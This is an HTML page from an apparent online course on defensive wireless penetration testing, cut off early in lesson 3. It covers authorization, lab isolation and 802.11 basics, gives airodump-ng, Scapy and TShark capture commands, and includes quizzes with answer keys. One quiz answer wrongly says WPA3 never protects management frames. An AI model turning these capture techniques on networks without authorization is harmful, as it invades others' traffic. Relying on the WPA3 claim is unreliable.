



<!DOCTYPE html>
<html lang="en">
  <head>
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Wireless Penetration Testing (Defense-First) Course Curriculum | CipherHall</title>
    <meta name="description" content="Begin your free Wireless Security course. This curriculum covers Wi-Fi fundamentals, WPA3, rogue AP detection, client hardening, and creating professional audit reports." />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png" />
    <link rel="shortcut icon" href="/favicon.png" type="image/x-icon" />
    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.png" />
    <link rel="canonical" href="https://www.cipherhall.com/courses/wireless-pen-testing-defense-first.html" />

    <script type="application/ld+json">
    {
      "@context": "https://schema.org",
      "@type": "Course",
      "name": "Wireless Penetration Testing (Defense‑First)",
      "description": "A comprehensive 20-lesson course on auditing and hardening wireless networks. This syllabus is designed for defensive, ethical use only, focusing on monitoring, detection, and hardening skills rather than exploitation.",
      "provider": {
        "@type": "Organization",
        "name": "CipherHall",
        "sameAs": "https://www.cipherhall.com"
      },
      "hasCourseInstance": {
        "@type": "CourseInstance",
        "courseMode": "Online",
        "instructor": {
          "@type": "Person",
          "name": "Prof. Anya Sharma"
        }
      }
    }
    </script>
    <meta name="robots" content="noindex, nofollow">
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap" rel="stylesheet" />
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" />
    <link rel="stylesheet" href="assets/css/coursepages.css">
</head>
  <body>
    <!-- Loading Screen -->
    <div id="loadingScreen" class="loading-screen">
      <div class="loader-icon">
        <i class="fas fa-graduation-cap"></i>
      </div>
      <div class="loader-text">Loading Course Content...</div>
    </div>

    <!-- Sidebar Overlay for Mobile -->
    <div class="sidebar-overlay" id="sidebarOverlay"></div>

    <!-- Music Player (fixed at top right) -->
    <div class="header-controls">
      <div class="music-dropdown" id="music-dropdown">
        <button class="btn btn-secondary">
          <span id="music-button-text">STUDY MUSIC</span>
          <i id="music-icon" class="fa-solid fa-music"></i>
        </button>
        <div class="music-dropdown-content" id="music-dropdown-content">
          <a
            href="#"
            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
            >1. Coffee Shop Vibes</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
            >2. City Lights Lofi</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
            >3. Mellow Thoughts</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
            >4. Rainy Mood</a
          >
          <a
            href="#"
            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
            >5. Time Alone</a
          >
          <a href="#" id="stop-music-link"
            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
          >
        </div>
      </div>

      <button class="btn btn-secondary" id="resetProgressBtn">
        <i class="fas fa-redo"></i>
        Reset Progress
      </button>
    </div>

    <!-- Auth Modal -->
    <div id="authModal" class="modal" style="display: none">
      <div class="modal-overlay"></div>
      <div class="modal-content">
        <span class="close" id="closeAuthModal">&times;</span>
        <div class="auth-tabs">
          <button id="tabSignIn" class="auth-tab active">Sign In</button>
          <button id="tabSignUp" class="auth-tab">Sign Up</button>
        </div>
        <div
          id="authLoader"
          style="display: none; text-align: center; padding: 2rem"
        >
          <i
            class="fas fa-spinner fa-spin fa-2x"
            style="color: var(--color-green)"
          ></i>
          <p style="margin-top: 0.5rem">Authenticating...</p>
        </div>
        <div id="signInForm" class="auth-form">
          <h2>Sign In to CipherHall</h2>
          <button id="googleSignIn" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignInForm">
            <input
              type="email"
              id="signInEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signInPassword"
              placeholder="Password"
              required
            />
            <button type="submit" class="btn btn-primary">Sign In</button>
          </form>
        </div>
        <div id="signUpForm" class="auth-form" style="display: none">
          <h2>Join CipherHall</h2>
          <button id="googleSignUp" class="btn btn-google">
            <i class="fab fa-google"></i> Continue with Google
          </button>
          <div class="divider"><span>or</span></div>
          <form id="emailSignUpForm">
            <input
              type="text"
              id="signUpName"
              placeholder="Full Name"
              required
            />
            <input
              type="email"
              id="signUpEmail"
              placeholder="Email Address"
              required
            />
            <input
              type="password"
              id="signUpPassword"
              placeholder="Password (min. 8 characters)"
              required
            />
            <button type="submit" class="btn btn-secondary">
              Create Account
            </button>
          </form>
        </div>
        <div id="authMessage"></div>
      </div>
    </div>

    <!-- Sidebar -->
    <aside class="sidebar" id="sidebar">
      <div class="sidebar-header">
        <div class="course-info">
          <h1 class="course-title" id="courseTitle">Loading...</h1>
          <div class="course-progress">
            <div class="progress-header">
              <span class="progress-label">Course Progress</span>
              <span class="progress-percentage" id="courseProgressPercent"
                >0%</span
              >
            </div>
            <div class="progress-bar">
              <div
                class="progress-fill"
                id="courseProgressFill"
                style="width: 0%"
              ></div>
            </div>
            <div class="progress-stats">
              <span id="completedLessons">0</span>
              <span id="totalLessons">0</span>
            </div>
          </div>
          <a href="/dashboard.html" class="back-to-dashboard">
            <i class="fas fa-arrow-left"></i>
            Back to Dashboard
          </a>
        </div>
      </div>

      <nav class="lesson-nav" id="lessonNav">
        <!-- Lessons will be loaded dynamically -->
      </nav>
    </aside>

    <!-- Main Content -->
    <main class="main-content">
      <header class="content-header">
        <div class="lesson-header">
          <div class="lesson-header-left">
            <span class="lesson-number" id="currentLessonNumber">1</span>
            <h1 class="lesson-header-title" id="currentLessonTitle">
              Loading...
            </h1>
          </div>
          <div class="lesson-actions">
            <button class="mbtn btn-primary" id="menuToggle">
              <i class="fas fa-bars"></i>
            </button>
          </div>
        </div>
      </header>

      <div class="content-body" id="contentBody">
        <div class="lesson-content" id="lessonContent">
          <!-- Lesson content will be loaded dynamically -->
        </div>
      </div>

      <footer class="lesson-navigation">
        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
        <div class="nav-controls">
          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
            <i class="fas fa-chevron-left"></i>
            Previous
          </button>
          <button class="btn btn-primary" id="nextLessonBtn" disabled>
            Next
            <i class="fas fa-chevron-right"></i>
          </button>
        </div>
      </footer>
    </main>

    <!-- Achievement Notification -->
    <div id="achievementNotification" class="achievement-notification">
      <div class="notification-header">
        <div class="notification-icon" id="notificationIcon">
          <i class="fas fa-trophy"></i>
        </div>
        <div class="notification-content">
          <h3 id="notificationTitle">Achievement Unlocked!</h3>
          <p id="notificationDescription">Description here...</p>
        </div>
      </div>
      <div class="notification-reward" id="notificationReward">
        <i class="fas fa-coins"></i>
        <span id="notificationPoints">+100 Points</span>
      </div>
    </div>

    <!-- Toast Notification -->
    <div id="toast" class="toast">
      <span id="toastMessage"></span>
    </div>

    <script>
      // =====================================================
      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
      // =====================================================

      // Supabase Configuration - Replace with your config
      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
      const supabaseKey =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);

      // =====================================================
      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
      // =====================================================
      const COURSE_DATA = {
        id: "wireless-pen-testing-defense-first",
        title: "Wireless Penetration Testing (Defense‑First)",
        description:
          "A comprehensive 20-lesson course on auditing and hardening wireless networks. This syllabus is designed for defensive, ethical use only, focusing on monitoring, detection, and hardening skills rather than exploitation. All activities are based on analyzing offline captures or configuring lab equipment you own or have explicit permission to test.",
        category: "cybersecurity",
        difficulty: "Intermediate",
        duration: "40 hours",
        instructor: "Prof. Anya Sharma",
        lessons: [
          {
            id: "lesson-1",
            title: "Legal, Ethics & Lab Setup",
            duration: "90 min",
            objectives: [
              "Understand the legal and ethical boundaries of wireless testing, including relevant laws like the CFAA and Wiretap Act.",
              "Define the critical components of a Rules of Engagement (RoE) document and understand its legal significance.",
              "Design a safe, isolated, and reproducible lab environment for wireless analysis using both physical and logical isolation techniques.",
              "Learn and apply best practices for capturing, handling, and preserving evidence to maintain a defensible chain of custody.",
            ],
            content: {
              overview:
                "Wireless security testing operates in a legal grey area by default, as radio waves are inherently uncontrollable. This lesson establishes the non-negotiable ethical and legal foundation required to perform this work responsibly. We will move beyond theory to practice, covering the critical documentation, secure lab design, and evidence handling procedures that protect both the analyst and the client from legal repercussions.",
              sections: [
                {
                  title: "Authorization, Scoping, and the Law",
                  content:
                    '<p>Testing a network without permission is a federal crime in many countries (e.g., Computer Fraud and Abuse Act - CFAA in the US). Wireless signals propagate beyond your control, making explicit authorization and precise scoping your primary legal defense.</p><h3>Key Legal Concepts:</h3><ul><li><strong>Written Authorization (Get-Out-of-Jail-Free Card):</strong> A signed document granting explicit permission to test specific assets. This must include a clause indemnifying you for accidental disruption.</li><li><strong>Scope Creep:</strong> The biggest threat to a legal engagement. Testing an out-of-scope SSID or BSSID, even if it belongs to the client, can void your authorization.</li><li><strong>Relevant Laws:</strong> Analysts should have a basic awareness of laws like the CFAA (US), which criminalizes unauthorized access to computers, and the Wiretap Act (US), which governs the interception of electronic communications. Your RoE must ensure compliance.</li></ul><h3>Rules of Engagement (RoE) Deep Dive:</h3><p>The RoE is the formal, signed playbook for the engagement. It must be unambiguous.</p><ul><li><strong>Who:</strong> Names of testers, emergency client contacts (24/7).</li><li><strong>What:</strong> Specific techniques permitted (e.g., passive scanning, deauthentication, WPA2 handshake capture, WPS pin attacks). Explicitly list what is <i>forbidden</i> (e.g., denial-of-service, accessing client data planes).</li><li><strong>Where:</strong> Physical addresses, GPS coordinates, or building floors. List of approved SSIDs and BSSIDs (by MAC address).</li><li><strong>When:</strong> Start/end dates and precise testing windows (e.g., "9:00 PM - 5:00 AM local time, Saturday night").</li><li><strong>How:</strong> Procedures for emergency stoppage, status reporting, and evidence handling.</li></ul>',
                },
                {
                  title: "Lab Design, Isolation, and Safety",
                  content:
                    '<p>A controlled lab is not a luxury; it is a requirement for ethical practice, tool development, and vulnerability research. The core principle is <strong>isolation</strong>—preventing your lab traffic from affecting others and vice-versa.</p><h3>Core Lab Components:</h3><ul><li><strong>Target Access Point (AP):</strong> A configurable AP that supports various security standards (WEP, WPA2, WPA3, 802.1X).</li><li><strong>Client Device:</strong> A laptop/VM or mobile device to generate legitimate traffic.</li><li><strong>Analysis Machine (The Attack Box):</strong> Typically a Linux laptop (Kali, Parrot OS) with a wireless NIC that supports Monitor Mode and Packet Injection (e.g., Alfa AWUS036ACH).</li><li><strong>Isolation Mechanisms:</strong><ul><li><strong>Physical (Best):</strong> RF-shielding enclosure (Faraday bag/cage). A cheap alternative is a tightly sealed microwave oven (unplugged!).</li><li><strong>Logical (Essential):</strong> Use a dedicated, air-gapped wireless router. Segment your lab network from your home/office network. Use non-interfering channels far from production networks.</li></ul></li></ul><h3>Virtualized Lab Setup:</h3><p>Using virtual machines for your analysis and client systems enhances reproducibility and safety.</p><ul><li><strong>Analysis VM:</strong> Kali Linux virtual machine. The host OS can handle the USB passthrough for the wireless adapter.</li><li><strong>Client VM:</strong> A clean Windows 10/11 VM to act as a victim device, connecting to your target AP.</li><li><strong>Network Isolation in VMware/VirtualBox:</strong> Set the VM network adapters to "Host-Only" or a dedicated "Lab Network" segment. This ensures no lab traffic accidentally routes to the internet.</li></ul>',
                },
                {
                  title: "Evidence Capture and Preservation",
                  content:
                    "<p>When conducting authorized tests, your evidence (packet captures, logs) must be collected and handled in a forensically sound manner to be credible.</p><h3>Best Practices:</h3><ul><li><strong>Hashing:</strong> Always generate cryptographic hashes (SHA-256) of your evidence files immediately after capture to prove they have not been altered.</li><li><strong>Metadata:</strong> Record the time, date, tool used, and tester name for each capture session.</li><li><strong>Chain of Custody:</strong> For formal engagements, maintain a log of who handled the evidence, when, and for what purpose.</li><li><strong>Secure Storage:</strong> Store evidence on encrypted drives to maintain confidentiality.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title:
                    "1. Verifying Monitor Mode and Selecting the Right Interface",
                  description:
                    "Before capturing, you must ensure your wireless card is in monitor mode and on the correct channel.",
                  code: "# List all wireless interfaces\niwconfig\n\n# Check available interfaces and their capabilities\nsudo airmon-ng\n\n# Put interface wlan0 into monitor mode on channel 6.\n# The new interface is often named wlan0mon or mon0.\nsudo airmon-ng start wlan0 6\n\n# Verify the new monitor mode interface is created and up\nsudo iwconfig",
                },
                {
                  title:
                    "2. Isolating Your Lab Network with iptables (On Lab Router)",
                  description:
                    "If using a Linux machine as your lab router, create firewall rules to block all traffic to your main network interface (eth0).",
                  code: "# FLUSH all existing rules to start fresh\nsudo iptables -F\n\n# DROP all outgoing traffic destined for the main network (eth0)\nsudo iptables -A OUTPUT -o eth0 -j DROP\n\n# DROP all incoming traffic from the main network (eth0)\nsudo iptables -A INPUT -i eth0 -j DROP\n\n# View the configured rules to confirm isolation\nsudo iptables -L -v",
                },
                {
                  title:
                    "3. Capturing Packets with Aircrack-ng and Generating a Hash",
                  description:
                    "Use airodump-ng to capture packets to a file. Then, generate a SHA-256 hash of the file to preserve its integrity as evidence.",
                  code: "# Start capturing packets on channel 6 using the monitor interface wlan0mon\n# Save the output to a file with prefix 'Client_Capture'\nairodump-ng -c 6 --write Client_Capture wlan0mon\n\n# In a new terminal, navigate to the capture file and generate a SHA-256 hash\nsha256sum Client_Capture-01.cap\n\n# Output will be a long string of characters, e.g.:\n# 9a7d85a2e2a5e0a8...e2a1b0c8  Client_Capture-01.cap\n# RECORD THIS HASH in your report and notes.",
                },
              ],
              activities: [
                {
                  title: "Draft a Detailed Rules of Engagement (RoE)",
                  description:
                    "Using the template below, draft a comprehensive RoE for 'Acme Corp'. They have authorized a test of their 'ACME-CORP' and 'ACME-GUEST' SSIDs in their single headquarters building from 10 PM to 2 AM next Saturday. Forbid any denial-of-service attacks. Your point of contact is John Doe (555-1234).\n\nTemplate Sections:\n1. Project Title & Parties Involved\n2. Authorization Statement\n3. Scope (Systems, Networks, Locations)\n4. Rules & Permitted Activities\n5. Restricted Activities\n6. Timeline & Testing Windows\n7. Emergency Contact Information\n8. Reporting Procedures\n9. Data Handling & Confidentiality",
                },
                {
                  title: "Build and Document a Virtualized Lab",
                  description:
                    "1. Diagram: Using a tool like draw.io or Lucidchart, create a detailed network diagram of your proposed lab. Include the Target AP, Client VM, Analysis VM, and the host machine. Show how the wireless and host-only networks connect and how they are isolated from the internet.\n2. Build: In VMware/VirtualBox, create a new 'Host-Only' network. Create a Windows 10 Client VM and a Kali Linux Analysis VM and assign them to this host-only network. Document the IP addresses each VM receives.\n3. Isolate: On your host machine, use a command like `ping` to verify the VMs can talk to each other but cannot access the internet.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Why is written authorization critically important for wireless testing, compared to wired testing?",
                  options: [
                    "It's not; a verbal agreement is sufficient.",
                    "Wireless signals can propagate beyond the target's intended physical boundary, making explicit legal protection necessary.",
                    "It's only needed for billing purposes.",
                    "Because wireless tools are more expensive to license.",
                  ],
                  correct: 1,
                  explanation:
                    "The uncontrolled nature of RF propagation means you could inadvertently intercept data from a neighboring network or interfere with its operations. Written authorization specifically scopes your actions and provides a legal defense.",
                },
                {
                  id: 2,
                  question:
                    "What is the primary purpose of generating a SHA-256 hash of a packet capture (pcap) file immediately after creation?",
                  options: [
                    "To reduce the file size for easier emailing.",
                    "To encrypt the file's contents so they cannot be read.",
                    "To provide a unique fingerprint that proves the evidence has not been altered or tampered with later.",
                    "It's a required step for the airodump-ng tool to work.",
                  ],
                  correct: 2,
                  explanation:
                    "The cryptographic hash acts as a seal of integrity. Any change to the file, even a single bit, will result in a completely different hash value, invalidating the evidence.",
                },
                {
                  id: 3,
                  question:
                    "Which of the following is the MOST effective method for physically isolating a wireless lab environment?",
                  options: [
                    "Using a different SSID name.",
                    "Setting your AP to the lowest power setting.",
                    "Placing all equipment inside a functioning Faraday cage.",
                    "Using a VPN on your analysis machine.",
                  ],
                  correct: 2,
                  explanation:
                    "A Faraday cage is a grounded, metallic enclosure that blocks all incoming and outgoing radio frequency (RF) signals, creating a truly isolated electromagnetic environment. This is the gold standard for physical isolation.",
                },
                {
                  id: 4,
                  question:
                    "In the RoE, which section explicitly protects you from accidentally testing a client's nearby 'HR-SECURE' network when you were only authorized to test 'ACME-GUEST'?",
                  options: [
                    "The Emergency Contact section.",
                    "The Timeline section.",
                    "The Scope section, specifically the list of approved SSIDs/BSSIDs.",
                    "The Reporting Procedures section.",
                  ],
                  correct: 2,
                  explanation:
                    "The Scope section is the definitive list of what is in-bounds and, by omission, what is out-of-bounds. Explicitly listing 'ACME-GUEST' and its BSSID makes testing 'HR-SECURE' a violation of the agreement, protecting you from scope creep.",
                },
              ],
            },
          },
          {
            id: "lesson-2",
            title: "RF & 802.11 Fundamentals",
            duration: "120 min",
            objectives: [
              "Understand and apply core Radio Frequency (RF) concepts like frequency, channel, bandwidth, and modulation to Wi-Fi analysis.",
              "Differentiate between the 2.4 GHz, 5 GHz, and 6 GHz bands, including their channels, regulatory constraints, and practical implications for penetration testing.",
              "Identify and analyze the three main 802.11 frame types (Management, Control, Data) and their key subtypes relevant to security assessments.",
              "Explain the difference between a BSS, ESS, IBSS, and BSSID and identify them in a packet capture.",
            ],
            content: {
              overview:
                "Wireless security is built upon a foundation of radio and protocol theory. This lesson provides the essential knowledge of how Wi-Fi works at the physical and data-link layers. You will learn to 'see' the radio spectrum and 'speak' the language of 802.11 frames, which is a prerequisite for effectively attacking or defending wireless networks. We will move from abstract concepts to practical analysis using common tools.",
              sections: [
                {
                  title: "Radio Frequency (RF) Primer for Pentesters",
                  content:
                    "<p>Wi-Fi is data modulated onto radio waves. Understanding these physical properties is key to effective testing, from optimizing antenna selection to causing intentional interference.</p><h3>Core Concepts:</h3><ul><li><strong>Frequency & Spectrum:</strong> Wi-Fi operates on unlicensed spectrum bands: 2.4 GHz, 5 GHz, and 6 GHz. Each band is divided into channels.</li><li><strong>Channels & Overlap:</strong> In the 2.4 GHz band, only channels 1, 6, and 11 are truly non-overlapping. Using overlapping channels (e.g., 1 and 2) causes cross-channel interference. The 5 GHz and 6 GHz bands have more, wider, non-overlapping channels.</li><li><strong>Bandwidth:</strong> The width of a channel (20, 40, 80, 160 MHz). Wider channels offer higher throughput but are more susceptible to interference and have fewer available non-overlapping options. A penetration tester might force a network onto a narrower channel to test its behavior.</li><li><strong>dBm & RSSI:</strong> Signal strength is measured in decibels relative to a milliwatt (dBm), a logarithmic scale. RSSI (Received Signal Strength Indicator) is a vendor-specific measurement based on dBm. Closer to 0 is stronger (e.g., -40 dBm is excellent, -90 dBm is very weak).</li></ul><h3>Bands in Depth:</h3><ul><li><strong>2.4 GHz:</strong> Longer range, better penetration through walls, but highly congested (Bluetooth, microwaves, cordless phones). Only 3 non-overlapping channels.</li><li><strong>5 GHz:</strong> Shorter range, less penetration, but far more channels and less congested. Includes Dynamic Frequency Selection (DFS) channels, which require APs to radar detection and vacate the channel if radar is present. This can be a source of network instability.</li><li><strong>6 GHz (Wi-Fi 6E/7):</strong> The newest band, offering the most spectrum and wide channels. Introduces new concepts like Automated Frequency Coordination (AFC) for standard-power indoor/outdoor APs.</li></ul>",
                },
                {
                  title: "802.11 Frame Types: The Language of Wi-Fi",
                  content:
                    "<p>All Wi-Fi communication is organized into frames. For a security analyst, Management frames are the most critical as they are always unencrypted and reveal network intelligence. Control frames manage access to the medium, and Data frames contain the encrypted (or unencrypted!) user payload.</p><h3>Management Frames (Type 0): The Broadcasters</h3><ul><li><strong>Beacon (Subtype 8):</strong> Broadcast by APs to advertise their presence. Contains the SSID, supported rates, security capabilities, and other network information. The primary target for network discovery.</li><li><strong>Probe Request (Subtype 4):</strong> Broadcast by clients to actively search for networks (\"Is 'HomeNetwork' here?\"). Can reveal hidden SSIDs and client profiles.</li><li><strong>Probe Response (Subtype 5):</strong> Sent by an AP in response to a Probe Request for a network it hosts.</li><li><strong>Authentication & Association (Subtype 11 & 0):</strong> Frames used to establish a connection between a client and an AP.</li><li><strong>Deauthentication (Subtype 12):</strong> A notification, not a request. Used to tear down a connection. It is a <i>management</i> frame sent <i>in the clear</i>, making it a prime tool for attacks.</li></ul><h3>Control Frames (Type 1): The Traffic Directors</h3><ul><li><strong>Request to Send/Clear to Send (RTS/CTS):</strong> Used to reserve the medium and avoid hidden node problems.</li><li><strong>Acknowledgment (ACK):</strong> Sent to confirm the receipt of a data frame. The absence of ACKs can indicate jamming or poor signal.</li></ul><h3>Data Frames (Type 2): The Payload Carriers</h3><ul><li>Encapsulate upper-layer protocols (TCP, IP, HTTP). In a secure network, the payload is encrypted by WPA2/WPA3. In an open or WEP network, the payload may be readable.</li></ul>",
                },
                {
                  title: "Wireless Network Structures: BSS, ESS, and IBSS",
                  content:
                    "<p>It's crucial to understand how devices are logically grouped.</p><ul><li><strong>Basic Service Set (BSS):</strong> The building block. A single AP and its associated clients. Identified by the AP's MAC address (the BSSID).</li><li><strong>Independent Basic Service Set (IBSS):</strong> An ad-hoc network where clients connect directly to each other without an AP. Also known as a peer-to-peer or Wi-Fi Direct network.</li><li><strong>Extended Service Set (ESS):</strong> A larger network formed by multiple APs (multiple BSSs) all broadcasting the same SSID. This is what allows roaming in a corporate or campus environment. The BSSID is unique per AP, but the SSID is the same across the ESS.</li><li><strong>BSSID vs. SSID:</strong> The SSID (e.g., \"Starbucks_WiFi\") is the human-readable network name. The BSSID is the MAC address of the specific AP broadcasting that SSID. A network with three APs has one SSID but three BSSIDs.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title:
                    "1. Analyze Frame Types in a Live Capture with Airodump-ng",
                  description:
                    "Airodump-ng provides a real-time view of networks and clients, categorizing the traffic it sees. This is the first step in any wireless assessment.",
                  code: "# Put your card in monitor mode on a specific channel (e.g., 6)\nsudo airmon-ng start wlan0 6\n\n# Start airodump-ng on the monitor interface (wlan0mon)\n# It will display BSSIDs, SSIDs, power level, # of beacons, # of data frames, and connected clients.\nsudo airodump-ng wlan0mon\n\n# To focus on a specific AP and channel, specify the channel and optionally save to a file.\nsudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w my_capture wlan0mon",
                },
                {
                  title:
                    "2. Parsing 802.11 Frame Types from a PCAP (Advanced Scapy)",
                  description:
                    "This Python script uses Scapy to provide a detailed breakdown of a packet capture, crucial for post-capture analysis and evidence examination.",
                  code: "from scapy.all import *\nfrom scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11Auth, Dot11Deauth\n\ndef analyze_wifi_frames(pcap_file):\n    \"\"\"Analyzes a PCAP file and provides a detailed breakdown of 802.11 frame types and subtypes.\"\"\"\n    print(f\"[+] Analyzing file: {pcap_file}\")\n    \n    # Define a more detailed subtype mapping\n    mgmt_subtypes = {\n        8: 'Beacon',\n        4: 'Probe Req',\n        5: 'Probe Resp',\n        11: 'Authentication',\n        12: 'Deauthentication',\n        0: 'Association Req',\n        1: 'Association Resp',\n        2: 'Reassociation Req',\n        3: 'Reassociation Resp',\n        10: 'Disassociation'\n    }\n    \n    ctrl_subtypes = {\n        11: 'RTS',\n        12: 'CTS',\n        13: 'ACK',\n        14: 'CF-End'\n    }\n    \n    frames = { 'Management': {}, 'Control': {}, 'Data': {} }\n    \n    try:\n        packets = rdpcap(pcap_file)\n    except Exception as e:\n        print(f\"Error reading PCAP: {e}\")\n        return\n    \n    for pkt in packets:\n        if pkt.haslayer(Dot11):\n            # Get frame type and subtype\n            frame_type = pkt.type\n            frame_subtype = pkt.subtype\n            \n            if frame_type == 0: # Management\n                subtype_name = mgmt_subtypes.get(frame_subtype, f'Mgmt-{frame_subtype}')\n                frames['Management'][subtype_name] = frames['Management'].get(subtype_name, 0) + 1\n                \n            elif frame_type == 1: # Control\n                subtype_name = ctrl_subtypes.get(frame_subtype, f'Ctrl-{frame_subtype}')\n                frames['Control'][subtype_name] = frames['Control'].get(subtype_name, 0) + 1\n                \n            elif frame_type == 2: # Data\n                # Data frames can also have interesting subtypes like Null (no data) or QoS\n                frames['Data']['Total'] = frames['Data'].get('Total', 0) + 1\n    \n    # Print results\n    for frame_type, subtypes in frames.items():\n        print(f\"\\n--- {frame_type} Frames ---\")\n        if not subtypes:\n            print(\"  None found.\")\n        for subtype, count in subtypes.items():\n            print(f\"  {subtype}: {count}\")\n\n# Execute the analysis on your captured file\nanalyze_wifi_frames('my_capture-01.cap')",
                },
                {
                  title: "3. Filtering for Specific Frames with TShark",
                  description:
                    "TShark (command-line Wireshark) is powerful for quickly extracting specific frame types from a large capture file using display filters.",
                  code: '# View only Beacon frames and display the SSID and BSSID\ntshark -r my_capture-01.cap -Y "wlan.fc.type_subtype == 0x08" -T fields -e wlan.bssid -e wlan.ssid\n\n# View only Deauthentication frames and show the source/destination MAC\ntshark -r my_capture-01.cap -Y "wlan.fc.type_subtype == 0x0c" -T fields -e wlan.sa -e wlan.da\n\n# View only Probe Request frames and show which SSIDs clients are looking for\ntshark -r my_capture-01.cap -Y "wlan.fc.type_subtype == 0x04" -T fields -e wlan.sa -e wlan.ssid\n\n# Count all frames by type (Management, Control, Data)\ntshark -r my_capture-01.cap -q -z io,stat,0,"wlan.fc.type == 0","wlan.fc.type == 1","wlan.fc.type == 2"',
                },
              ],
              activities: [
                {
                  title: "Wireless Spectrum Analysis",
                  description:
                    "1. Using a tool like `airodump-ng` or a graphical tool like `LinSSID`/`WiFi Explorer`, survey the 2.4 GHz and 5 GHz bands in your environment. 2. Create a table noting the SSID, BSSID, channel, signal strength (dBm), and bandwidth for each network found. 3. Identify which channels are most congested in the 2.4 GHz band. 4. Identify any networks operating on DFS channels in the 5 GHz band.",
                },
                {
                  title: "Frame Capture and Analysis",
                  description:
                    "1. In your isolated lab, capture wireless traffic for 5 minutes using `airodump-ng -w lab_capture`. 2. Use the provided Python script to analyze the resulting PCAP file. 3. Write a brief report answering: What was the most common Management frame subtype? Did you capture any Probe Request frames? If so, what SSIDs were requested? How many Data frames were captured compared to Management frames?",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "Why are channels 1, 6, and 11 the only non-overlapping channels in the 2.4 GHz band?",
                  options: [
                    "They are the only channels allowed by the FCC.",
                    "They are the only channels that support 40 MHz bandwidth.",
                    "Their center frequencies are separated by 25 MHz, which is wider than the 22 MHz bandwidth of a single channel, preventing signal overlap.",
                    "They are the default channels on all consumer routers.",
                  ],
                  correct: 2,
                  explanation:
                    "A Wi-Fi channel is approximately 22 MHz wide. The center frequencies of channels 1, 6, and 11 are 5 MHz apart (e.g., 2412, 2437, 2462 MHz). This 5 MHz spacing means adjacent channels overlap significantly. Channels 1, 6, and 11 are separated by 25 MHz, ensuring their signals do not overlap.",
                },
                {
                  id: 2,
                  question:
                    "A penetration tester observes a high number of 'Deauthentication' frames in a packet capture. What is the most likely explanation?",
                  options: [
                    "The network is experiencing excellent signal quality.",
                    "A client is voluntarily disconnecting from the network repeatedly.",
                    "The access point is faulty and needs to be rebooted.",
                    "An attacker is likely performing a denial-of-service attack against a client or the entire network.",
                  ],
                  correct: 3,
                  explanation:
                    "Deauthentication frames are management frames that are unencrypted and can be spoofed by an attacker. They are used to forcibly disconnect a client from an AP. A flood of these frames is a hallmark of a deauth attack, a common wireless DoS technique.",
                },
                {
                  id: 3,
                  question:
                    "What key difference allows you to distinguish between an Extended Service Set (ESS) and multiple independent Basic Service Sets (BSSs) in a packet capture?",
                  options: [
                    "The BSSIDs will be identical for an ESS.",
                    "The encryption type (e.g., WPA2) will be different for each BSS in an ESS.",
                    "The SSID will be the same across multiple BSSIDs in an ESS, while independent BSSs will have different SSIDs.",
                    "An ESS will only operate on the 5 GHz band.",
                  ],
                  correct: 2,
                  explanation:
                    "An ESS is a set of one or more interconnected BSSs that share a single SSID to form a single logical network. Each AP in the ESS has its own unique BSSID (MAC address), but they all broadcast the same SSID. Independent BSSs would have different SSIDs.",
                },
                {
                  id: 4,
                  question:
                    "Which of the following 802.11 frame types is ALWAYS sent unencrypted, even on a WPA3-secured network, and is therefore a primary source of intelligence for a passive attacker?",
                  options: [
                    "Data Frames",
                    "Control Frames",
                    "Management Frames",
                    "QoS Data Frames",
                  ],
                  correct: 2,
                  explanation:
                    "Management frames are used to control the establishment and maintenance of connections. They must be readable by all devices, including those not yet authenticated, and are therefore never encrypted. This includes Beacons, Probe Responses, and Deauthentications.",
                },
              ],
            },
          },
          {
            id: "lesson-3",
            title: "Wireless Standards & Security Modes",
            duration: "90 min",
